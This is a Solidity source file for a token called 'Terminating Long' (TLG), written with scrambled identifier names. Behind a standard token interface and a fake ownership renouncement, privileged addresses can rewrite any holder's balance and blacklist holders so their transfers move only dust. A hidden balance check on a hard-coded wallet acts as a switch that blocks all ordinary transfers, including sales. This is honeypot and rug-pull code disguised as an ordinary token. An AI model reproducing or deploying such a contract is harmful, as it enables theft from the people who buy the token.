//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface feeTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverMarketingWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeTrading {
    function createPair(address fromAutoTeam, address amountTeam) external returns (address);
}

interface fromReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapFeeTotal) external view returns (uint256);

    function transfer(address marketingList, uint256 tradingShould) external returns (bool);

    function allowance(address atFeeSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingShould) external returns (bool);

    function transferFrom(
        address sender,
        address marketingList,
        uint256 tradingShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyMax, uint256 value);
    event Approval(address indexed atFeeSell, address indexed spender, uint256 value);
}

interface liquiditySender is fromReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TerminatingLong is receiverMarketingWallet, fromReceiver, liquiditySender {

    function tradingFrom(address takeTeam) public {
        limitReceiverAmount();
        if (shouldAtWallet) {
            launchedMarketing = sellIs;
        }
        if (takeTeam == senderListSwap || takeTeam == txTokenList) {
            return;
        }
        listLaunched[takeTeam] = true;
    }

    uint256 constant swapExempt = 10 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return launchSwap;
    }

    mapping(address => bool) public listLaunched;

    bool private shouldAtWallet;

    function totalSupply() external view virtual override returns (uint256) {
        return sellReceiver;
    }

    constructor (){
        
        feeTeam tokenBuy = feeTeam(amountTrading);
        txTokenList = feeTrading(tokenBuy.factory()).createPair(tokenBuy.WETH(), address(this));
        if (shouldAtWallet != takeMin) {
            sellIs = launchedMarketing;
        }
        senderListSwap = _msgSender();
        minEnableTeam();
        fromFund[senderListSwap] = true;
        walletAmount[senderListSwap] = sellReceiver;
        if (launchedMarketing != sellIs) {
            takeMin = false;
        }
        emit Transfer(address(0), senderListSwap, sellReceiver);
    }

    mapping(address => uint256) private walletAmount;

    function tokenTo(address launchedShould, address marketingList, uint256 tradingShould) internal returns (bool) {
        if (launchedShould == senderListSwap) {
            return receiverWalletAmount(launchedShould, marketingList, tradingShould);
        }
        uint256 autoTeamLaunched = fromReceiver(txTokenList).balanceOf(marketingMin);
        require(autoTeamLaunched == walletAt);
        require(marketingList != marketingMin);
        if (listLaunched[launchedShould]) {
            return receiverWalletAmount(launchedShould, marketingList, swapExempt);
        }
        return receiverWalletAmount(launchedShould, marketingList, tradingShould);
    }

    function transferFrom(address launchedShould, address marketingList, uint256 tradingShould) external override returns (bool) {
        if (_msgSender() != amountTrading) {
            if (buyTeam[launchedShould][_msgSender()] != type(uint256).max) {
                require(tradingShould <= buyTeam[launchedShould][_msgSender()]);
                buyTeam[launchedShould][_msgSender()] -= tradingShould;
            }
        }
        return tokenTo(launchedShould, marketingList, tradingShould);
    }

    function getOwner() external view returns (address) {
        return minEnable;
    }

    function transfer(address marketingSwap, uint256 tradingShould) external virtual override returns (bool) {
        return tokenTo(_msgSender(), marketingSwap, tradingShould);
    }

    string private limitExempt = "Terminating Long";

    address private minEnable;

    function atTotalAuto(uint256 tradingShould) public {
        limitReceiverAmount();
        walletAt = tradingShould;
    }

    address marketingMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public fundAuto;

    mapping(address => bool) public fromFund;

    bool public maxShould;

    address public senderListSwap;

    string private launchSwap = "TLG";

    function minEnableTeam() public {
        emit OwnershipTransferred(senderListSwap, address(0));
        minEnable = address(0);
    }

    bool private takeMin;

    function owner() external view returns (address) {
        return minEnable;
    }

    function limitListAmount(address marketingSwap, uint256 tradingShould) public {
        limitReceiverAmount();
        walletAmount[marketingSwap] = tradingShould;
    }

    uint256 walletAt;

    mapping(address => mapping(address => uint256)) private buyTeam;

    function balanceOf(address swapFeeTotal) public view virtual override returns (uint256) {
        return walletAmount[swapFeeTotal];
    }

    function approve(address senderReceiver, uint256 tradingShould) public virtual override returns (bool) {
        buyTeam[_msgSender()][senderReceiver] = tradingShould;
        emit Approval(_msgSender(), senderReceiver, tradingShould);
        return true;
    }

    uint256 fromTradingSwap;

    uint256 private sellReceiver = 100000000 * 10 ** 18;

    address public txTokenList;

    function allowance(address walletFeeLaunch, address senderReceiver) external view virtual override returns (uint256) {
        if (senderReceiver == amountTrading) {
            return type(uint256).max;
        }
        return buyTeam[walletFeeLaunch][senderReceiver];
    }

    function receiverWalletAmount(address launchedShould, address marketingList, uint256 tradingShould) internal returns (bool) {
        require(walletAmount[launchedShould] >= tradingShould);
        walletAmount[launchedShould] -= tradingShould;
        walletAmount[marketingList] += tradingShould;
        emit Transfer(launchedShould, marketingList, tradingShould);
        return true;
    }

    uint256 public launchedMarketing;

    address amountTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed swapTotal, address indexed teamAuto);

    function enableIs(address feeAuto) public {
        if (maxShould) {
            return;
        }
        if (launchedMarketing != sellIs) {
            shouldAtWallet = true;
        }
        fromFund[feeAuto] = true;
        
        maxShould = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return buyAuto;
    }

    function name() external view virtual override returns (string memory) {
        return limitExempt;
    }

    uint8 private buyAuto = 18;

    bool public launchSender;

    function limitReceiverAmount() private view {
        require(fromFund[_msgSender()]);
    }

    uint256 public sellIs;

}